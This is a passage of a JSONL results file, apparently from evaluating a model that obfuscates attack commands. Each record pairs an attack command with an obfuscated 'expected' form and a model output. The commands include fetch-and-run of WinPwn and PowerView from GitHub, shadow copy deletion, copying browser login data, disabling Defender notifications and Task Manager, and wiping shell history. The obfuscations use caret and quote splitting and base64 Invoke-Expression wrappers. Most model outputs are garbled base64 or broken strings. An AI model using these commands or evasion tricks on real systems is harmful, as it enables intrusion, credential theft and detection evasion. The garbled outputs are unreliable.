/IM a"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbluekeep -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') bl;uek,ee^p; -noninteractive -consoleoutput", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBXb3JsZCAtLS0gRGVmYXVsdFJlcG9ydCAje3tpIC9zdHlsZSBjb25maWd1cmF0aW9uLnNlcnZpY2UiIHRleHQvdi"}
{"input": "New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value '#{command_to_execute}'\nNew-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\nStart-Sleep -s 3\n", "output_expected": "New-Item -Force -Path HKCU:\\Software\\Classes\\Folder\\shell\\open\\command -Value", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TmV0LW5hbWUgIiN7ZmlsZXMvY29tbWFuZCBkYXRhIC1jbnVsbCAje3ByaWNlfSI=')) | Invoke-Expression\""}
{"input": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "output_expected": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSCo\"nnections\" /t REG_DWORD /d 0 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnVzLm1haWwuZXhlIC9Tb2NrQXVkaWVuY2UgIiAvdmFsdWUvdGltZSAtIjs=')) | Invoke-Expression\""}
{"input": "New-ItemProperty -Path HKCU:\\Environment -Name COMPlus_ETWEnabled -Value 0 -PropertyType \"String\" -Force", "output_expected": "New-ItemProperty -Path HKCU:\\Environment -Name COMPlus_ETWEnabled -Value 0 -PropertyType \"Str\"ing\"\" -Force", "output_model": "New-ItemProperty -Path HKCU:\\Environment -Name COMPlus_ETWEnabled -Value 0 -PropertyType String -Force"}
{"input": "net time \\\\#{computer_name}\nw32tm /tz\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0IHRpbWUgXFwje2NvbXB1dGVyX25hbWV9CnczMnRtIC90eg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmFtZTpQdWJsaXN0IC9mYWNlfSAje1xkb3VzLmRvbWFpbnM=')) | Invoke-Expression\""}
{"input": "\"%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}\"\n", "output_expected": "%PROGRAMFILES(x86)%/", "output_model": "\"%PROGRA~1/\\\"\")(x86)%\\PDQ Deploy.exe\""}
{"input": "reg add HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram /v ImagePath /t REG_SZ /d \"#{malicious_file}\"\n", "output_expected": "reg add HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram /v ImagePath /t R E   G _SZ /d \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvcC5leGUgIiAvbGVhcm5pbmdfIC90aWNrIGFyZHdhcmVfZmllbGRzX3BhdGggLWlzY29zcGFyZSB7d"}
{"input": "NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK\ncopy '#{local_file}' '*:\\'\n", "output_expected": "NET USE * '", "output_model": "net use * '',t,r,a,n,s,p,o,r,t:Q,U,I,C, ,/S,K,I,P,C,E,R,T,C,H,E,C,K, ',/,S,K,I,P,,C,O,P,Y,',<|"}
{"input": "wmic.exe shadowcopy delete\n", "output_expected": "wmic.exe shadowcopy \"del\"ete", "output_model": "\"wmic.exe\" \"shadowcopy\" delete"}
{"input": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"#{redirection_url}\" /f", "output_expected": "reg HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer /v MicrosoftRedirectionURL /t REG_SZ /d", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGludGVybW9kZSB0aGUgJiBmYWNlIHRlbXAgL21hdGFy')) | Invoke-Expression\""}
{"input": "New-NetEventSession -Name Capture007 -LocalFilePath \"$ENV:Temp\\sniff.etl\"\nAdd-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100\nStart-NetEventSession -Name Capture007\nStop-NetEventSession -Name Capture007\nRemove-NetEventSession -Name Capture007\n", "output_expected": "New-NetEventSession -LocalFilePath $ENV:Temp\\sniff.etl Add-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100 Start-NetEventSession -Name Capture007 Stop-NetEventSession -Name Capture007 Remove-NetEventSession -Name Capture007 -Name Capture007", "output_model": "New-NetEventSession -Name Capture007 -LocalFilePath \"$ENV:Temp\\sniff.etl\" Add-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100 Start-NetEventSession -Name Capture007 Stop-NetEventSession -Name Capture007 Remove-NetEventSession -Name Capture007\n##"}
{"input": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()\n", "output_expected": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()", "output_model": "powershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JzN7ZXRhIC9IZWxsbyBtYXJrLmFzb25uZWN0aW9ucw==')) | Invoke-Expression\""}
{"input": "Set-PSReadLineOption -AddToHistoryHandler { return $false }\n", "output_expected": "Set-PSReadLineOption -AddToHistoryHandler { ret\"urn\" $false }", "output_model": "Set-PSReadLineOption -AddToHistoryHandler { return $false }"}
{"input": "net stop SuperBackupMan", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0IHN0b3AgU3VwZXJCYWNrdXBNYW4=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnNvdXBsZUJhc2tmaWxlfQ==')) | Invoke-Expression\""}
{"input": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"\nStart-Process $file1 /S;\n", "output_expected": "Inv,ok^e-^W,ebReq,uest; -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\" Start-Process $file1 /S;", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JE1haWx0b29sLUFjY2VzcwouZGlzY29yZHMgI3tmaWxlIC9vcmRlciAje3toaWRpdGVfZnJvbTogOiB7dXNl"}
{"input": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force\n", "output_expected": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 \\\"-\\\"\\\"F\\\"\\\"o\\\"\\\"r\\\"\\\"c\\\"\\\"e\\\" New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force New-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Tm90ZXJwICN7Y29kdWxlVGVzdC5jbGFzc3RlZCBmb3IgPSAiMjUyIiBQcm9maWxlIEhvcml6b25hdGlvbnMgLSBDaG"}
{"input": "truncate -s0 #{history_path}\n", "output_expected": "truncate", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3Rlcn0gLW5hbWU=')) | Invoke-Expression\""}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /t REG_SZ /d Block /f\n", "output_expected": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System /v EnableSmartScreen /t REG_DWORD /d 0 /f reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System /v ShellSmartScreenLevel /t REG_SZ /d Block /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGxhbmd1aXRzI3BvbHlwcmVzcC5leGUgLy9pbnN0ZWxsICJ7Zm9sZGVyX3Byb2plY3QiO2tleSBoYW5"}
{"input": "if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;\nsudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}\nsudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}\n", "output_expected": "if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi; sudo c  p", "output_model": "if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi; sudo cp  if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi; sudo cp  sudo launchctl load -w ~/Library/LaunchAgents/ if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~"}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -sc dclist\n", "output_expected": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"", "output_model": "\\\"Pat\"\"hToAto\"\"micsFo\"\"lder\\..\\Exter\"\"nalPayl\"\"ods\\AdFi\"\"nd.exe\\\"  \\\"-sc\\\" dclist   -s c dlist   -s c dclist   -sc dc   list<|endof"}
{"input": "\"#{uacme_exe}\"\n", "output_expected": "\"\"\"\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGUgLW5hbWV9IC1jIGRlY2tobWQi')) | Invoke-Expression\""}
{"input": "scp #{username}@#{remote_host}:#{remote_file} #{local_path}\n", "output_expected": "scp", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje21hbGwgIi9maWxlLnRlYXB0ZS5jcmwwfQ==')) | Invoke-Expression\""}
{"input": "reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /v \"Driver\" /d \"#{monitor_dll}\" /t REG_SZ /f\n", "output_expected": "reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /v \"Driver\" /d \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje3RlbXBsYWNlIC9IZWxsbw==')) | Invoke-Expression\""}
{"input": "reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f\n", "output_expected": "reg /v ShowInfoTip /t REG_DWORD /d 0 /f reg add HKCUSoftwareMicrosoftWindowsCurrentVersionExplorerAdvanced /v ShowCompColor /t REG_DWORD /d 0 /f add HKCUSoftwareMicrosoftWindowsCurrentVersionExplorerAdvanced", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIHNvbWUBZ3JpY2VzIC1BbXBwcmlhbiAjey5odHRwczovL2FwaS9sb2dpbnMuYXV0aDA=')) | Invoke-Expression\"<|endoftext"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol IEX (IWR https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1 -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose = [Net.SecurityProtocolType]::Tls12", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UkVHSU4uRXhlY3V0ZSBQcm9wZW5hbnMgLWJsdWNrIC9lbmNyeXB0ZWRfdG9waWM=')) | Invoke-Expression\""}
{"input": "wmic.exe /node:\"192.168.0.1\" process call create \"{CMD}\"", "output_expected": "wmic.exe /node:\"192.168.0.1\" process call create {CMD}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje3Byb2R1Y3QgLXJlZmVyZW5jZSAtICN7dGFpbn0iIHt7IHt7UGVyc29uIC1jb2xvciAiTGVnZSB"}
{"input": "Start-Process \"shell:AppsFolder\\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App\"", "output_expected": "Start-Process \"shell:AppsFolder\\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGhlIHBvbGljeU5ldyBDaGVja291dCBQcmFjZSBEb2N1bWVudCAiTWljcm9zIEJhc2VzIGxvY2FsaXphdGlvbiAiaHR0c"}
{"input": "sudo unlink #{system_log_path}\n", "output_expected": "sudo unlink", "output_model": "\"s\"\"u\"\"d\"\"o\"\" u\"\"n\"\"l\"\"i\"\"n\"\"k\" \"#{system_log_path}\""}
{"input": "cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0ICN7YmFzaF9oaXN0b3J5X2ZpbGVuYW1lfSB8IGdyZXAgI3tiYXNoX2hpc3RvcnlfZ3JlcF9hcmdzfSA+ICN7b3V0cHV0X2ZpbGV9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9kZXYvdmVyX3NldHQgI3tmaWxlLm5hbWU=')) | Invoke-Expression\""}
{"input": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n", "output_expected": "reg /f HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionExplorerAdvanced /t REG_DWORD /v HideFileExt /d 1 add", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJldmVudC97ZmlsZW5hbWUgLzIwMTItMDYuMjA3IDIxMiAtNTA=')) | Invoke-Expression\""}
{"input": "sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin", "output_expected": "sysadminctl interactive \"-add\"User art-tester -fullName ARTUser -password !pass123! -admin", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC9kaXJlY3Rpb25zLmNvbSAtZWNvdmF0aW9uKCJtZXJjbGllbnQiIHwgIGJlc3BvbnN0YW50fSIgPSB7Y"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /d 1 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIiAvdiBEaXNhYmxlVGFza21nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==')) | Invoke-Expression\"", "output_model": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /d 1 /f"}
{"input": "Set-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "output_expected": "Set-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer", "output_model": "Set-Location PathToAtomicsFolder .\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer \"\"-Domain \"\"-Subdomain \"\"-QueryType \"<|endoftext|"}
{"input": "net use c: #{share_name}\nnet share test=#{share_name} /REMARK:\"test share\" /CACHE:No\n", "output_expected": "net use c: \\\"", "output_model": "net use c:\nnet share test= /REMARK:\"test share\" /CACHE:No net use c:\nnet share test= /REMARK:\"test share\" /CACHE:No"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n", "output_expected": "\\\"[Net.ServicePointManager]::SecurityProtocol\\\" = [Net.SecurityProtocolType]::Tls12 IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) $macrocode = \" a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\" Invoke-MalDoc -macroCode $macrocode -officeProduct \"", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing)\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice"}
{"input": "ln -sf /dev/null #{history_path}\n", "output_expected": "ln -sf /dev/null", "output_model": "ln -sf /dev/null#{history_path}"}
{"input": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n", "output_expected": "Copy-Item PathToAtomicsFolder\\..\\ExternalPayloads $env:APPDATA\\Opera Software\\Opera Stable\\Login Data -Destination", "output_model": "Copy-Item $env:APPDATA\\Opera Software\\Opera Stable\\Login Data -Destination PathToAtomicsFolder\\..\\ExternalPayloads"}
{"input": "winget.exe install --accept-package-agreements -s msstore {name or ID}", "output_expected": "winget.exe install --accept-package-agreements -s \"mss\"tore {name or ID}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuIHN0YWNrIC1sb2NhbC5jbG9jayIKdXJpbmciOiAidGVzdCB7ZmllbGRzIiBDb3VydHlwZSIgLWxpc3QyIGNvbW1h"}
{"input": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IEFXU19SRUdJT049I3thd3NfcmVnaW9ufSAKY2QgI3tzdHJhdHVzX3BhdGh9CmVjaG8gInN0YXJ0aW5nIHdhcm11cCIKLi9zdHJhdHVzIHdhcm11cCBhd3MuZGVmZW5zZS1ldmFzaW9uLmNsb3VkdHJhaWwtbGlmZWN5Y2xlLXJ1bGUKZWNobyAic3RhcnRpbmcgZGV0b25hdGUiCi4vc3RyYXR1cyBkZXRvbmF0ZSBhd3MuZGVmZW5zZS1ldmFzaW9uLmNsb3VkdHJhaWwtbGlmZWN5Y2xlLXJ1bGUgLS1mb3JjZQ==')) | Invoke-Expression\"", "output_model": "export AWS_REGION= cd stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule echo starting detonate aws.defense-evasion.cloudtrail-lifecyc<|endof"}
{"input": "Get-ChildItem \"#{file_path}\" | % { $_.LastWriteTime = \"#{target_date_time}\" }\n", "output_expected": "Get-ChildItem", "output_model": "Get-ChildItem \"\\\"\"\\\" | % { $_.LastWriteTime = \"\\\"\"\\\"\\\"\"\\\" }"}
{"input": "reg add \"HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f\n", "output_expected": "reg add \"HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /v Debugger /t REG_SZ /delete \"copy:\\Windows\\System32\\notepad.exe\" /f", "output_model": "reg add HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs /v Debugger /t REG_SZ /d C:\\Windows\\System32\\notepad.exe /f"}
{"input": "cat /etc/passwd |grep nobody\nchsh --shell /bin/bash nobody\nusermod --password $(openssl passwd -1 nobody) nobody\nsu -c \"whoami\" nobody\n", "output_expected": "cat /etc/passwd |grep nobody chsh --shell /bin/bash nobody usermod --password $(openssl passwd -1 nobody) nobody su -c whoami nobody", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSAuZXhlICRmaWxlIGxldmVsLCAyMDAwMDE0NDUzNjg3IHdoaWxsZXIgKGFyZSBpbiBwcm9nbmFtZSAoMSkgZmlsbC"}
{"input": "echo [InternetShortcut] > #{shortcut_file_path}\necho URL=C:\\windows\\system32\\calc.exe >> #{shortcut_file_path}\n#{shortcut_file_path}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBbSW50ZXJuZXRTaG9ydGN1dF0gPiAje3Nob3J0Y3V0X2ZpbGVfcGF0aH0KZWNobyBVUkw9Qzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZSA+PiAje3Nob3J0Y3V0X2ZpbGVfcGF0aH0KI3tzaG9ydGN1dF9maWxlX3BhdGh9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBFeHByIC9QcmVkaXJlY3RvciAje1xmaWxlIiAvdGhlLmFzbSAtL0NvbXBsZXRpbmdUeXBlOiMuL1JFQUlMOi5"}
{"input": "msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD}\"", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXNlZGdld2VidmlldzIuZXhlIC0tZGlzYWJsZS1ncHUtc2FuZGJveCAtLWdwdS1sYXVuY2hlcj0ie0NNRH0i')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhlY3V0bG9vciAje1xhcHBsaWNhdGlvbnMiI2FsbCB7IG5leHRyICN7dHJpcGVkfSI=')) | Invoke-Expression\""}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Ce   n  te r   \\  N ot ifi   ca  ti  ons   \" /v \"DisableNotifications\" /t REG_DWORD /d 1 /f", "output_model": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications /v DisableNotifications /t REG_DWORD /d 1 /f"}
{"input": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" *\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JiAiUGF0aFRvQXRvbWljc0ZvbGRlclwuLlxFeHRlcm5hbFBheWxvYWRzXEFkRmluZC5leGUiICN7b3B0aW9uYWxfYXJnc30gLWggI3tkb21haW59IC1zIHN1YnRyZWUgLWYgIm9iamVjdGNsYXNzPWNvbXB1dGVyIiAq')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JAB0AHMAdGVzdC5leGUgL3NlcnZpY2VzIC9maWxlbmFtZX0iI3twcm9qZWN0cy97c3RhcnRQb3dlcl9jb3JyZWRfcXV"}
{"input": "copy \"#{inputfile}\" #{outputfile}\n$myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036_003\n", "output_expected": "copy \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29udGVudC5leGUgLUNvbXBvbmVudCAje2FsbHNyZWRlbnRpYWxzfQ==')) | Invoke-Expression\""}
{"input": "touch #{file_to_setcap}\nsudo setcap cap_setuid=ep #{file_to_setcap}\n", "output_expected": "touch sudo setcap cap_setuid=ep", "output_model": "touch \"\\\"\"setcap = ep \\\"\\#{fil<"}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 2\n", "output_expected": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 2", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JERhdGUgLWwuZy5zdGF0aWMgc3RyaXN0LmVkdS9leGVjLnBocCc+')) | Invoke-Expression\""}
{"input": "zip -r  #{input_folder}/#{input_file}.zip #{input_folder}\nopenssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc \ncat #{input_folder}/#{input_file}.enc | base64", "output_expected": "zip -r", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3JpdGUgLzEuIC1jICR7Zm9vIGJhY2tldCAtLS0jeiI=')) | Invoke-Expression\"\nzip -r \"   #{input_folder}/#{input_"}
{"input": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n", "output_expected": "Copy-Item \",$^e;nv:^A;P;P^D^ATA\\Op;er,a Software\\Opera Stable\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZFNlcnZlclRvIG5ldHdvcmtzIGEgL2xhbmcvcmVsYXRpdmluZyAje3tleSB7YWxsb3dlcjogMTU1NTM0ODIw"}
